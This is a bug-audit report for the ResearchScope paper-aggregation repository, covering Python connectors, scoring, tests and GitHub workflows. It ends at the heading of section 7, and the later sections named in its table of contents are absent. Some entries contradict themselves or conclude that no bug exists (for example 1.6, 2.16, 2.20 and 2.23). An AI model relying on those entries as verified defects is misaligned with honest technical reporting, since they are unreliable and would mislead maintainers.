# ResearchScope — Comprehensive Bug & Issue Report

> **Auditor:** Saad 
> **Date:** 2026-04-14  
> **Scope:** Every file in the repository — Python source, tests, CI/CD workflows, frontend JS, config files.  
> **Policy:** Bugs are documented only — **no solutions are included**.

---

## Table of Contents

1. [Critical Bugs — Will Cause Runtime Failures](#1-critical-bugs--will-cause-runtime-failures)
2. [Logic Bugs — Silent Wrong Behavior](#2-logic-bugs--silent-wrong-behavior)
3. [Architecture / Design Issues](#3-architecture--design-issues)
4. [Dependency & Packaging Issues](#4-dependency--packaging-issues)
5. [Test Suite Issues](#5-test-suite-issues)
6. [CI/CD Workflow Issues](#6-cicd-workflow-issues)
7. [Frontend (JavaScript) Issues](#7-frontend-javascript-issues)
8. [Security Issues](#8-security-issues)
9. [Data Integrity Issues](#9-data-integrity-issues)
10. [Code Quality / Maintainability Issues](#10-code-quality--maintainability-issues)
11. [Configuration Issues](#11-configuration-issues)
12. [Documentation Issues](#12-documentation-issues)

---

## 1. Critical Bugs — Will Cause Runtime Failures

### 1.1 `difficultyBadge` function defined twice in `app.js`
**File:** `site/assets/js/app.js` — Lines 52–53 and Lines 80–87  
The function `difficultyBadge` is declared twice in the same file. The first declaration (line 52) takes a plain string `d`; the second (line 80) takes a `paper` object. The second definition silently overwrites the first. Any call path that relies on the first signature (passing a raw string) will now receive `undefined` for all badge lookups, producing broken UI elements. The first definition also calls `renderBadge` which expects HTML-escaped output, while the second writes raw HTML — a behavioral inconsistency.

---

### 1.2 `local variable 'debounce' shadows outer function` in `app.js`
**File:** `site/assets/js/app.js` — Lines 39–45 (outer `debounce` utility) and Line 312 (`let debounce;` inside `initSearch`)  
Inside `initSearch`, `let debounce;` is declared as a plain timeout handle, shadowing the module-level `debounce` utility function by the same name. Any code inside or after `initSearch` that tries to call the outer `debounce(fn, delay)` function will instead get `undefined` (or a number after the first timeout is set), causing a `TypeError: debounce is not a function`.

---

### 1.3 `_arxiv_id` regex does not match versioned IDs correctly
**File:** `src/dedup/deduplicator.py` — Lines 32 and 38–45  
`_ARXIV_ID_RE` is `r"^arxiv:(\d{4}\.\d{4,5})"` — it strips the version suffix only when extracting from the paper ID string `"arxiv:2501.12345v2"`. However the regex stops at the version number because `\d{4,5}` is greedy and `v2` follows a non-digit. The extracted group will be `2501.12345`, but then `_enrich_affiliations_from_s2()` (pipeline.py line 82) strips the version with `p.id.replace("arxiv:", "").split("v")[0]`, while `_arxiv_id()` does NOT strip the `v2` suffix — it captures only the numeric portion. Old-style arXiv IDs (e.g., `astro-ph/0601001`) contain a slash and will **not** match either regex, causing those papers to always be treated as unique even when duplicates exist.

---

### 1.4 `_mirror_to_site` copies `papers_db.json` AND all other files identically — dead-code branch
**File:** `src/sitegen/generator.py` — Lines 106–116  
Both branches of the `if json_file.name in self._DB_ONLY_FILES` condition call the same `shutil.copy2(json_file, site_data / json_file.name)` statement. The comment says db-only files are "never fetched by frontend JS", but they are committed to the repo and served via GitHub Pages like every other file, including the 46 MB `papers_db.json`. The entire `if / else` distinction is dead code — both paths do the same thing.

---

### 1.5 `_fetch_venue_search` fallback in `openreview_connector.py` re-fetches ALL papers and silently truncates
**File:** `src/connectors/openreview_connector.py` — Lines 114–132  
When the `/notes/search` endpoint fails, the exception handler calls `self._fetch_venue_all(venue_id)[:max_results]` as a fallback. `_fetch_venue_all` is a paginated method that fetches ALL notes, potentially thousands. This means a single failed search query triggers a full scrape of the entire venue, with a 1-second delay per page, while the caller only requested a handful of results. The `except Exception` swallows the original error completely with no logging.

---

### 1.6 `p.year` compared to `_CURRENT_YEAR` without guarding `year == 0`
**File:** `src/aggregation/aggregator.py` — Lines 160, 229, 253, 316  
**File:** `src/clustering/clusterer.py` — Line 124  
**File:** `src/scoring/scorer.py` — Lines 346–347  
Papers with no year information are assigned `year = 0` (schema default). The expression `_CURRENT_YEAR - paper.year <= 2` evaluates to roughly `2026 - 0 = 2026`, which is **not** `<= 2`, so year-0 papers are correctly excluded from "recent". However, `_recency(year=0)` in `scorer.py` correctly returns `0.0` for year 0, but `_CURRENT_YEAR - paper.year >= 10` will be `True` for year 0 (age ≈ 2026), correctly returning 0.0. The *actual* danger is in `fetch_range` (arxiv_connector.py line 106): if `date_from` is somehow a future date (user passes a future YYYY-MM-DD), `days` becomes negative but the code proceeds without error, sending a malformed date range query to arXiv.

---

### 1.7 `PMLRConnector._PMLRParser` closes ALL `div` tags, not just `.paper` divs
**File:** `src/connectors/pmlr_connector.py` — Lines 78–80  
`handle_endtag` for `"div"` checks `if self._current and self._current.get("title")` and immediately appends and resets `_current`. Since PMLR pages contain many nested `div`s (site chrome, headers, footers), any closing `</div>` encountered while `_current` is non-None and has a title will prematurely finalize the record, cutting off abstracts and author data mid-parse. There is no class check or depth counter to confirm that the closing `div` corresponds to the opening `.paper` div.

---

### 1.8 `_CVFListParser` `_dd_depth` counter can go negative
**File:** `src/connectors/cvf_connector.py` — Lines 95–104  
`_dd_depth` is decremented in `handle_endtag` for `"dd"` only when `_in_authors_dd` is True. However `_in_authors_dd` is set to `True` for *any* `<dd>` encountered while `_current` is not None (line 78), but there is no guard for deeply nested `<dd>` tags within the paper entry. A `<dd>` inside another `<dd>` (which occurs in real CVF HTML) will increment `_dd_depth` twice on open but only decrement once on close because the outer `</dd>` sets `_in_authors_dd = False` and clears `_current`. The next paper's `<dd>` starts with a stale `_dd_depth > 0`, potentially preventing `_current` from ever being flushed.

---

### 1.9 `_parse_bibtex` regex uses a fixed 4-space indent assumption
**File:** `src/connectors/acl_connector.py` — Lines 147–157  
The field extraction regex `r'\n    (\w+)\s*=\s*...'` requires exactly 4 leading spaces. BibTeX files typically use inconsistent indentation (tabs, 2 spaces, etc.). The ACL Anthology export uses varying indentation depending on which generation tool was used. Fields with indentation other than exactly 4 spaces will be silently skipped, producing papers with empty titles/authors/abstracts and no error.

---

### 1.10 `today_mode` flag mutation in pipeline causes misleading control flow
**File:** `src/pipeline.py` — Lines 224–232  
Inside the `elif today_mode and not conferences_only:` branch, if `fetch_today` raises an exception, `today_mode = False` is set. But the variable `today_mode` is a local parameter — it does NOT affect the already-evaluated `elif` that controls whether keyword queries run (line 234). Lines 234 and 245 both reference the now-mutated `today_mode = False`, which means the keyword query fallback block *will* run, but the `not skip_acl and not conferences_only` block at line 245 also uses `today_mode` indirectly — the comment "fall through to keyword queries" works, but only by accident of the if-chain structure, not by explicit design. If the structure of the if-chain is ever rearranged, this implicit dependency will silently break the fallback.

---

## 2. Logic Bugs — Silent Wrong Behavior

### 2.1 Jaccard dedup updates `kept` index but keeps stale slot reference
**File:** `src/dedup/deduplicator.py` — Lines 132–135  
```python
result[merged_into] = _merge(paper, existing)
kept[kept.index(merged_into)] = merged_into   # keeps same slot
```
The comment says "keep same slot" and the code reassigns the same value back to the list — `kept[idx] = merged_into` where `merged_into` is already the value at that index. This is a no-op. The intent appears to be to update the winner in `result` and keep the index unchanged, which does happen (line 134), but the line 135 assignment is meaningless dead code that creates confusion about whether the index was supposed to change.

---

### 2.2 `_completeness` in `deduplicator.py` and `_completeness` in `scorer.py` are different functions with same concept
**File:** `src/dedup/deduplicator.py` — Lines 49–66  
**File:** `src/scoring/scorer.py` — Lines 276–284  
Two separate functions both named `_completeness` (or `_completeness` / conceptually) exist with entirely different scoring formulas. The dedup version awards 5 points for a non-arXiv venue, while the scorer version has no such bonus. A paper chosen as "winner" by the dedup pass (based on one formula) may not be the highest-quality paper according to the scorer's formula. This inconsistency can lead to lower-scored papers surviving deduplication.

---

### 2.3 Layer 1 gap extraction only keeps the FIRST description per topic
**File:** `src/gaps/gap_extractor.py` — Lines 162–178  
Despite collecting all limitation sentences into `bucket["descs"]`, only `bucket["descs"][0]` (the very first matched sentence) is used as the gap description. All subsequent limitation sentences from all papers in that topic are silently discarded. A topic with 50 papers each mentioning different limitations produces a single gap representing only the first paper's first limitation sentence.

---

### 2.4 `_author_slug` creates collisions for names differing only in special characters
**File:** `src/aggregation/aggregator.py` — Lines 25–26  
`_author_slug("Jean Dupont")` → `"jean_dupont"`  
`_author_slug("Jean-Dupont")` → `"jean_dupont"` (same result)  
Two distinct authors with names that differ only in hyphens/accents/apostrophes will be merged into a single author object, attributing all papers and metrics of one to the other. This is particularly common with East Asian names, hyphenated surnames, and names with diacritics.

---

### 2.5 `_lab_momentum` formula uses magic hard-coded weights, ignoring `weights.yaml`
**File:** `src/aggregation/aggregator.py` — Lines 248–257  
`config/weights.yaml` defines `lab_momentum` weights, but `_lab_momentum()` uses hard-coded values `0.5`, `0.3`, `0.2` instead of reading from `_WEIGHTS`. The YAML config for lab momentum has no effect on the actual computation.

---

### 2.6 `_uni_momentum` ignores paper quality entirely
**File:** `src/aggregation/aggregator.py` — Lines 310–318  
University momentum is computed solely from the ratio of recent papers to total papers. Two universities with the same recency ratio get identical momentum scores regardless of whether their papers are low-quality arXiv preprints or top-venue A* publications. Conference rank and average paper score are entirely ignored.

---

### 2.7 `hype_score` field on `Paper` is never written
**File:** `src/normalization/schema.py` — Line 69  
**File:** `src/scoring/scorer.py` — entire file  
`Paper.hype_score` is defined in the schema and present in `to_dict()` output, but `PaperScorer.score()` never sets it. It will always be `0.0` in every piece of JSON output. The field also never appears in any score breakdown or editorial logic.

---

### 2.8 `evidence_strength` field on `Paper` is never written
**File:** `src/normalization/schema.py` — Line 70  
Same as above — `Paper.evidence_strength` is declared but never populated by any stage of the pipeline.

---

### 2.9 `_HOT_TAGS` in `scorer.py` does not match actual tag names produced by `tagger.py`
**File:** `src/scoring/scorer.py` — Lines 91–94  
```python
_HOT_TAGS = {
    "LLMs", "Transformers", "Diffusion Models", "RAG", "Multimodal",
    "Code Generation", "AI Safety & Alignment", "AI Agents",
}
```
The actual tags produced by `PaperTagger` are:
- `"Large Language Models"` (not `"LLMs"`)
- `"Transformer Architectures"` (not `"Transformers"`)
- `"Retrieval-Augmented Generation"` (not `"RAG"`)
- `"Multimodal Learning"` (not `"Multimodal"`)
- `"Code Generation & Synthesis"` (not `"Code Generation"`)
- `"AI Agents & Tool Use"` (not `"AI Agents"`)

None of these six tags will ever match `_HOT_TAGS`. `_topic_centrality()`, `_trend_alignment()`, and `AuthorMomentumScorer._topic_strength()` will return `0.0` for virtually every paper, making those scoring components permanently dead. The same mismatch exists in `_TRENDING_TOPICS` in `clusterer.py` (line 58–61).

---

### 2.10 `_TOPIC_DIFFICULTY` in `clusterer.py` uses abbreviated keys that don't match actual topic names
**File:** `src/clustering/clusterer.py` — Lines 16–24  
Keys like `"LLMs"`, `"Transformers"`, `"RL"`, `"GNN"`, `"RAG"`, `"QA"`, `"Sentiment Analysis"`, `"NLP"` do not match the full tag names output by `PaperTagger` (e.g., `"Large Language Models"`, `"Transformer Architectures"`, etc.). The fallback `_TOPIC_DIFFICULTY.get(tag, "L2")` will always return `"L2"` for every tag, making the entire difficulty configuration table inert.

---

### 2.11 `_PREREQUISITES` in `clusterer.py` also uses wrong keys
**File:** `src/clustering/clusterer.py` — Lines 31–44  
Same issue: prerequisite lookups like `_PREREQUISITES.get("LLMs", [])` will never match tags like `"Large Language Models"`. Every topic's prerequisite list will be empty.

---

### 2.12 `_WHY_MATTERS` tag keys in `content/generator.py` don't match actual tags
**File:** `src/content/generator.py` — Lines 14–30  
Keys like `"LLMs"`, `"Transformers"`, `"RL"`, `"GNN"`, `"RAG"`, `"Computer Vision"`, `"Speech"`, `"Code Generation"`, `"Multimodal"`, `"Federated Learning"`, `"Model Compression"` do not match the full tag names. The `_why_it_matters` method will fall through to `"_default"` for virtually every paper: `"This work represents a meaningful contribution to its field and opens new research directions."` — a generic and useless string.

---

### 2.13 `_HOOK_PATTERNS` in `content/generator.py` suffers the same tag mismatch
**File:** `src/content/generator.py` — Lines 32–38  
Same malfunction: `"LLMs"`, `"Diffusion Models"`, `"RL"`, `"AI Safety & Alignment"` won't match real tags, so `_hook()` always uses `_HOOK_PATTERNS["_default"]`.

---

### 2.14 `_STARTER_TEMPLATES` keys in `gap_extractor.py` also mismatch tag names
**File:** `src/gaps/gap_extractor.py` — Lines 60–108  
Keys include `"LLMs"`, `"Transformers"`, `"RL"`, `"Computer Vision"`, `"Multimodal"`, `"Code Generation"`, `"NLP"`, `"AI Safety & Alignment"`. None match the actual tag strings. `_starter_projects()` will always return `_STARTER_TEMPLATES["_default"]`, making all per-topic starter ideas invisible.

---

### 2.15 `build_labs` fetches wrong name when lab is already in `paper.lab_ids`
**File:** `src/aggregation/aggregator.py` — Lines 214–217  
```python
for lid in paper.lab_ids:
    if lid not in [_org_slug(l) for l in aff_labs]:
        aff_labs.append(lid)
```
When a lab is taken from `paper.lab_ids`, `lid` is a slug (e.g., `"openai"`). It is appended to `aff_labs` as a slug string, then used as `lab_name` at line 224: `Lab(lab_id=lid, name=lab_name ...)`. The lab's name becomes the raw slug (`"openai"`) rather than the canonical form (`"OpenAI"`), creating duplicate lab objects with ugly names.

---

### 2.16 Recency formula in `ranking.py` is mathematically broken
**File:** `researchscope/analysis/ranking.py` — Line 44  
```python
score += recency_w * max(0.0, 365 - age_days / 30)
```
For a paper published 365 days ago: `age_days = 365`, `365 - 365/30 ≈ 365 - 12.2 = 352.8`. For a paper published today: `365 - 0 = 365`. The formula was likely intended to give `365 - age_days`, not `365 - age_days/30`. As written, even a paper published 10,950 days (30 years) ago gets a non-zero recency bonus (`max(0, 365 - 365) = 0`), but papers as old as 10,950 days would need `age_days/30 > 365` → `age_days > 10,950`. The formula effectively gives near-constant recency scores for anything published within the last ~30 years.

---

### 2.17 `fetch` in `CVFConnector` and `PMLRConnector` fetches ALL papers just to keyword-filter them
**File:** `src/connectors/cvf_connector.py` — Lines 162–180  
**File:** `src/connectors/pmlr_connector.py` — Lines 124–140  
Both `fetch(query, max_results)` implementations scrape the entire conference proceedings page (potentially thousands of papers, multiple HTTP requests with delay) just to apply a simple `.lower().includes(query)` filter. This is called from the daily keyword-query pipeline for every search term. A single pipeline run triggers full re-scrapes of all CVF conferences (CVPR2024, CVPR2023, ICCV2023, ECCV2024, ECCV2022) for each of up to 4 queries — potentially 20 full scrapes per pipeline run.

---

### 2.18 `SemanticScholarConnector.fetch` does not respect `max_results` correctly
**File:** `src/connectors/semantic_scholar_connector.py` — Lines 133–150  
`per_venue = max(10, max_results // len(self._venues))`. With 9 venues and `max_results=50`, `per_venue = max(10, 5) = 10`. Total returned can be up to `9 × 10 = 90` papers, which is `180%` of `max_results`. The caller's limit is silently exceeded with no truncation.

---

### 2.19 `_enrich_affiliations_from_s2` misses the `externalIds` field in the API response
**File:** `src/pipeline.py` — Lines 98–105  
The batch endpoint is called with `fields=authors.name,authors.affiliations` but NOT `fields=externalIds`. The code on line 101 calls `rec.get("externalIds")` which will always return `None` for every record, making `arxiv_id = ext.get("ArXiv", "")` always empty. No paper will ever be matched this way. The affiliation enrichment is completely broken.

---

### 2.20 `Paper.fetched_at` default is evaluated once per module import, not per instance
**File:** `src/normalization/schema.py` — Line 94  
```python
fetched_at: str = field(default_factory=_now_iso)
```
`_now_iso` is a function, so `default_factory=_now_iso` is correct — it is called once per instance creation. This is **not** a bug. However, the companion call in connectors like `arxiv_connector.py` line 193 (`fetched_at=datetime.now(timezone.utc).isoformat()`) explicitly passes `fetched_at`, bypassing the default. If the explicit call is incorrect (e.g., timezone-naive), the timestamps will be inconsistent. This is a latent inconsistency rather than an immediate bug.

---

### 2.21 `_latex_char` function strips all LaTeX accents to the empty string
**File:** `src/connectors/acl_connector.py` — Lines 54–65  
`_LATEX_MAP` maps every LaTeX accent command to `""` (empty string). `_latex_char` removes the accent and returns `inner[len(prefix):]`. For `{\\'e}`, `inner = "\\'e"`, prefix found is `"\\'"`, returns `"e"` — this is correct. But for `{\\~{n}}` (ñ), the inner is `"\\~{n}"`, prefix is `"\\~"`, returns `"{n}"`, which still contains braces. The subsequent `re.sub(r'[{}]', '', fval)` on line 156 removes the braces, giving `"n"` — correct but fragile. For compound accents like `{\\\"o}` → `inner = "\\\"o"`, prefix `'\\"'` (backslash + quote) may not match due to Python string escape handling in the dict literal on line 55 where `'\\\"'` is the key.

---

### 2.22 `pickPaperOfTheDay` uses wrong day-of-year calculation
**File:** `site/assets/js/app.js` — Lines 363–369  
```javascript
const startOfYear = new Date(today.getFullYear(), 0, 0);  // ← day 0 = Dec 31 of prev year
const dayOfYear = Math.floor((today - startOfYear) / 86400000);
```
`new Date(year, 0, 0)` creates December 31 of the *previous* year (month index `0` = January, day `0` = last day of previous month = December 31 of the prior year). This makes `dayOfYear` off by one and also makes it range from 1 to 366 instead of 0 to 365. For a pool of exactly 365 papers, index 365 would cause an out-of-bounds access that wraps around via `% pool.length` — giving December 31 the same paper as January 1 of the previous year.

---

### 2.23 `weekLabel()` `mon` Date mutation corrupts `now` calculation
**File:** `site/assets/js/app.js` — Lines 381–388  
```javascript
const mon = new Date(now); mon.setDate(now.getDate() - ((dow + 6) % 7));
const sun = new Date(mon); sun.setDate(mon.getDate() + 6);
```
`new Date(now)` creates a copy, so `now` is not mutated here. However, `sun.setDate(mon.getDate() + 6)` **sets `sun`'s date** using `mon`'s current day-of-month, then adds 6. If `mon` is day 28 and the month has 28 days, `28 + 6 = 34` wraps into the next month — JavaScript handles this correctly with Date. **The actual bug** is subtler: `mon.setDate(now.getDate() - ...)` mutates `mon` in place, but `now.getDate()` is used in the formula, which is fine since `now` is unaffected. However, if `dow = 0` (Sunday), the formula gives `(0 + 6) % 7 = 6`, placing Monday 6 days before Sunday — which is correct for an ISO week. But if `dow = 1` (Monday), `(1 + 6) % 7 = 0`, meaning `mon.setDate(now.getDate() - 0) = now.getDate()` — correct. This logic is actually correct, but fragile — any DST transition can make the 86400000ms assumption wrong.

---

## 3. Architecture / Design Issues

### 3.1 Two entirely separate and incompatible codebases coexist
The repository contains two independent implementations:
- **`src/`** — the production pipeline (dataclasses, `urllib`, no external HTTP library)
- **`researchscope/`** — a legacy CLI prototype (Pydantic models, `httpx`, `tinydb`)

These use **different data models** (`Paper` dataclass in `src/` vs. Pydantic `Paper` in `researchscope/models/`), **different storage engines**, **different collectors**, and **different APIs** for the same concept. The CLI (`researchscope/cli.py`) explicitly marks itself as `.. deprecated::` in its docstring but is still exposed as a `project.scripts` entry point in `pyproject.toml`. Users running `researchscope search` will use a completely different, unmaintained code path.

---

### 3.2 No retry logic or circuit breaker for external HTTP calls
Across all connectors (`arxiv_connector.py`, `acl_connector.py`, `semantic_scholar_connector.py`, `openreview_connector.py`, `cvf_connector.py`, `pmlr_connector.py`), network failures are caught and logged but no automatic retry is implemented (except for `fetch_range` which has exactly one manual retry). A transient 503 error from any source silently drops all papers from that source for the entire pipeline run with no alerting.

---

### 3.3 `_load_existing_papers` reads up to 46 MB of JSON into memory unconditionally
**File:** `src/pipeline.py` — Lines 125–157  
`papers_db.json` is currently 46 MB and will grow over time (capped at 10,000 papers). The entire file is loaded, deserialized into `Paper` objects, and then filtered by date — all in one blocking synchronous operation. On a resource-constrained GitHub Actions runner with a slow disk, this can add 10–30 seconds to every pipeline run and risks `MemoryError` on systems with limited RAM.

---

### 3.4 `topics.yaml` config is loaded but its content is never actually used
**File:** `src/tagging/tagger.py` — Lines 17–25  
`_load_topics()` reads `config/topics.yaml` and returns a dict, but the returned value is never used anywhere in the module. The tagger always falls back to the hard-coded `_BUILTIN_RULES`. The `topics.yaml` file therefore has zero effect on tagging behavior.

---

### 3.5 `weights.yaml` `arxiv_queries` and `acl_venues` keys are never read
**File:** `config/weights.yaml` — Lines 54–73  
The YAML config defines `arxiv_queries` and `acl_venues` sections, but nothing in the codebase reads these keys. Default queries are hard-coded in `pipeline.py` (lines 162–172) and venue lists are hard-coded in `acl_connector.py`. The config file is misleadingly incomplete — it implies configuring queries/venues is possible, but it is not.

---

### 3.6 `canonical_id` field on `Paper` is declared but never set
**File:** `src/normalization/schema.py` — Line 27  
`Paper.canonical_id` is documented as "dedup-stable ID (same work across sources)" but `Deduplicator.deduplicate()` never sets it. The field is always `""` in all output, making cross-source linking impossible.

---

### 3.7 `cluster_id` field on `Paper` is never set
**File:** `src/normalization/schema.py` — Line 50  
`TopicClusterer.cluster()` builds `Topic` objects and assigns papers to them, but never sets `paper.cluster_id` on the individual `Paper` objects. The field is always `""`.

---

### 3.8 `paper.limitations` and `paper.future_work` are declared but never populated by the pipeline
**File:** `src/normalization/schema.py` — Lines 80–81  
No stage of the pipeline (`GapExtractor`, `ContentGenerator`, `DifficultyAssessor`) ever writes to `paper.limitations` or `paper.future_work`. These fields are always `[]`. The `GapExtractor` reads from `paper.limitations` but it will always be empty. `_gap_summary` in `clusterer.py` counts papers with limitations — always 0.

---

### 3.9 `prerequisites` field on `Paper` is declared but never populated
**File:** `src/normalization/schema.py` — Line 60  
No pipeline stage sets `paper.prerequisites`. It is always `[]`.

---

### 3.10 `maturity_stage` field on `Paper` is declared but never set by any pipeline stage
**File:** `src/normalization/schema.py` — Line 61  
Default is `"emerging"` for every paper. No logic ever updates this.

---

### 3.11 No rate limit handling — HTTP 429 errors will silently drop papers
All connectors catch generic `Exception` and log a warning, but do not specifically handle HTTP 429 (Too Many Requests). If the arXiv API or Semantic Scholar returns rate limit errors, the connector silently returns empty results with no exponential backoff or retry-after header parsing.

---

## 4. Dependency & Packaging Issues

### 4.1 `requirements.txt` and `pyproject.toml` specify conflicting dependency sets
**File:** `requirements.txt` lists: `arxiv>=2.1.0`, `requests>=2.31.0`, `pyyaml>=6.0`  
**File:** `pyproject.toml` `[project.dependencies]` lists: `httpx>=0.27`, `rich>=13`, `typer>=0.12`, `pydantic>=2`, `tinydb>=4`

The production pipeline (`src/`) uses **only** `urllib` (stdlib) and optionally `arxiv` and `pyyaml`. It does not use `requests`, `httpx`, `rich`, `typer`, `pydantic`, or `tinydb`. The legacy CLI (`researchscope/`) uses `httpx`, `rich`, `typer`, `pydantic`, and `tinydb`. The two sets are completely distinct, meaning:
- `pip install -r requirements.txt` does not install the packages needed to run `researchscope` CLI.
- `pip install .` (from pyproject.toml) does not install `arxiv` or `pyyaml`, breaking the production pipeline.
- Neither file is self-sufficient.

---

### 4.2 `pyproject.toml` `[tool.setuptools.packages.find]` excludes `src/`
**File:** `pyproject.toml` — Lines 46–48  
```toml
[tool.setuptools.packages.find]
where = ["."]
include = ["researchscope*"]
```
Only the legacy `researchscope/` package is discovered. The entire `src/` pipeline tree is excluded from the installable distribution. Installing the package via `pip install .` gives you the deprecated CLI but not the actual pipeline.

---

### 4.3 `requests` in `requirements.txt` is never imported anywhere in the codebase
**File:** `requirements.txt` — Line 2  
`requests>=2.31.0` is listed as a dependency but is not imported in any file in either `src/` or `researchscope/`. The production pipeline uses `urllib.request`; the legacy CLI uses `httpx`. `requests` is dead weight.

---

### 4.4 `pydantic>=2` in `pyproject.toml` but `pydantic` is only used in the deprecated legacy CLI
The legacy `researchscope/models/` uses Pydantic v2 (`model_dump`, `model_copy`). The production `src/` uses plain dataclasses. Installing `pydantic` for the production pipeline is unnecessary.

---

### 4.5 `tinydb>=4` depends on `researchscope/storage/store.py` which is deprecated
`tinydb` is only used in `PaperStore` in the legacy CLI path. No production pipeline code uses it.

---

## 5. Test Suite Issues

### 5.1 Three entire test files are explicitly excluded from CI
**File:** `.github/workflows/tests.yml` — Lines 35–37  
```yaml
--ignore=tests/test_storage.py \
--ignore=tests/test_analysis.py \
--ignore=tests/test_models.py
```
These files test the legacy `researchscope/` package (including `PaperStore` and `ArxivCollector`). They are excluded because the CI only installs `requirements.txt` (which doesn't include `pydantic`, `tinydb`, `httpx`) — confirming the split dependency problem in §4.1. Any bugs introduced in those three test files will never be caught by CI.

---

### 5.2 `test_models.py` imports `researchscope.models.author.Author` which has no `momentum_score` field
**File:** `tests/test_models.py` — Line 5  
`from researchscope.models.author import Author`  
The legacy `Author` model (`researchscope/models/author.py`) has fields: `author_id`, `name`, `affiliations`, `paper_ids`, `h_index`, `citation_count`. It does NOT have `momentum_score`.  
`tests/test_schema.py` line 75 tests `a.momentum_score == 0.0` but imports `from src.normalization.schema import Author` — the production Author. If someone runs `test_models.py` with the wrong import, asserting `author.h_index == 0` passes; but if `test_schema.py` is mixed up, tests will fail with `AttributeError`.

---

### 5.3 `test_dedup.py:test_prefers_more_complete_paper` may be order-dependent
**File:** `tests/test_dedup.py` — Lines 34–39  
```python
p1 = _paper("Shared Title", "p1", abstract="")
p2 = _paper("Shared Title", "p2", abstract="A full abstract here.")
result = self.dedup.deduplicate([p1, p2])
assert result[0].id == "p2"
```
Dedup pass 1 (arXiv ID) does not apply (no arXiv IDs). Pass 2 (title similarity): p1 is processed first (index 0) and added to `kept`. When p2 is processed, it matches p1 — `_completeness(p2) > _completeness(p1)` because p2 has an abstract. So `result[merged_into] = _merge(p2, p1)` — p2 wins. Then the test asserts `result[0].id == "p2"` ✓. But this works only because `_merge` fills p2's missing fields from p1, and the winner replacement updates `result[merged_into]`. If the pass were reversed (p2 first), p2 would be in `kept`, p1 would be deduplicated away, and p2 wins trivially. The test passes regardless of order — but it does not test the direction where the first-seen paper has better completeness and the second is weaker (the "wrong winner" scenario with reversed order).

---

### 5.4 `test_tagging.py:test_ai_safety_tag` tests for wrong tag name
**File:** `tests/test_tagging.py` — Line 57  
```python
assert "AI Safety & Alignment" in p.tags
```
The tagger produces `"AI Safety & Alignment"` (matching exactly `r"ai safety|alignment|..."` → `"AI Safety & Alignment"`). This actually works—but the test is inadvertently passing for the wrong reason: the keyword `"hallucination"` in the abstract matches tag `"Factuality & Hallucination"`, while `"alignment"` matches `"AI Safety & Alignment"`. The test title says "ai_safety_tag" but the abstract trigger relies on `"alignment"`, not safety. If `"alignment"` is removed from the regex (e.g., to reduce false positives), the test would break.

---

### 5.5 `conftest.py` `sample_paper` fixture has `conference_rank=""` explicitly
**File:** `tests/conftest.py` — Line 30  
The fixture explicitly passes `conference_rank=""`. Tests that check score behavior (`test_conference_rank_boosts_paper_score`) rely on a separate `_paper()` helper and never use this fixture for rank tests — fine. But tests like `test_roundtrip` in `test_schema.py` use `sample_paper` then assert round-trip equality; if `conference_rank=""` serializes differently from absent (it doesn't in JSON), this is latent.

---

### 5.6 No integration tests for the full pipeline
There are zero tests that execute `run_pipeline()` end-to-end, even with mocked HTTP. A full integration failure (e.g., a stage raising an unhandled exception) would only be caught when running the actual GitHub Actions pipeline — not in the test suite.

---

### 5.7 `test_storage.py` does not close the `store` fixture
**File:** `tests/test_storage.py` — Line 12  
```python
@pytest.fixture
def store(tmp_path: Path) -> PaperStore:
    return PaperStore(db_path=tmp_path / "test_papers.json")
```
The fixture has no `yield` + `finally: store.close()` cleanup. `PaperStore` wraps `TinyDB`, which buffers writes. If the fixture is torn down without `close()`, writes may not be flushed. On some OS configurations this can cause the `test_context_manager` test to appear to pass (because re-opening the file works) while other tests may have incomplete data.

---

## 6. CI/CD Workflow Issues

### 6.1 `pipeline.yml` and `update.yml` both exist and overlap in purpose
Both workflows run the pipeline and commit data. `pipeline.yml` runs at 06:00 UTC and uses `--today` mode; `update.yml` runs at 02:00 UTC on weekdays and uses no flags (keyword-query mode). They both push to `site/data/` and use the same `push-to-main` concurrency group. If both are triggered simultaneously (e.g., manual `workflow_dispatch` while cron fires), only one will run at a time (due to `cancel-in-progress: false`), but the second will run immediately after, potentially double-committing data with inconsistent intermediate states.

---

### 6.2 `update.yml` commits to `data/` but the SiteGenerator writes to `site/data/`
**File:** `.github/workflows/update.yml` — Lines 47–53  
```yaml
git add data/
if git diff --cached --quiet; then
  echo "changed=false" >> "$GITHUB_OUTPUT"
```
But `SiteGenerator._mirror_to_site()` writes JSON to `site/data/`, not `data/`. The `git add data/` in `update.yml` stages the wrong directory (or nothing, since `data/` only contains `.gitkeep`). The `changed=false` output is therefore always emitted. The subsequent deploy step still runs (it doesn't check `changed`), but the commit step (`if: steps.check.outputs.changed == 'true'`) is **never triggered**, meaning updated data is never committed to the repo by this workflow. The `pipeline.yml` workflow correctly stages `site/data/` — confirming the inconsistency.

---

### 6.3 `deploy.yml` triggers on every push to `main` — including bot commits
**File:** `.github/workflows/deploy.yml` — Lines 7–8  
Every commit (including automated `chore: daily arXiv update` commits from the pipeline bot) triggers a fresh GitHub Pages deployment. This can result in dozens of Pages deployments per day, consuming Actions minutes and creating noisy deployment history.

---

### 6.4 `pipeline.yml` uses `git push || true` — silently eats push failures
**File:** `.github/workflows/pipeline.yml` — Line 79  
```yaml
git diff --cached --quiet || git commit -m "..." && git push || true
```
`|| true` makes push failures invisible. If the push fails (merge conflict, network issue, permissions error), the pipeline succeeds in CI, data is lost, and no one is notified.

---

### 6.5 `backfill.yml` uses `PYTHONPATH: ${{ github.workspace }}` but `pipeline.yml` does not
**File:** `.github/workflows/backfill.yml` — Line 52  
**File:** `.github/workflows/pipeline.yml` (absent)  
The pipeline requires `sys.path.insert(0, ...)` at the top of `pipeline.py` to make imports work. `PYTHONPATH` being set in backfill but not pipeline means import behavior differs between workflows. The manual `sys.path.insert` in `pipeline.py` line 31 patches this for the pipeline workflow, but it's inconsistent.

---

### 6.6 `conference-sync.yml` references `OPENAI_API_KEY` and `ANTHROPIC_API_KEY` secrets that are never used
**File:** `.github/workflows/conference-sync.yml` — Lines 44–45  
These secrets are passed as environment variables but no code in the conference-sync mode reads or uses them. The keys are exposed in the environment unnecessarily.

---

### 6.7 `tests.yml` installs `requirements.txt` plus `pytest` but lacks `pyproject.toml` dev dependencies
**File:** `.github/workflows/tests.yml` — Line 30  
```yaml
run: pip install -r requirements.txt pytest
```
`ruff`, `pytest-cov`, and other dev deps from `pyproject.toml [dev]` are not installed. Coverage reports and linting cannot run in CI. The `pyproject.toml` specifies `pytest>=8` as a dev dep, but CI installs a bare `pytest` without a version pin — a future pytest major version could break tests silently.

---

## 7. Frontend (JavaScript) Issues

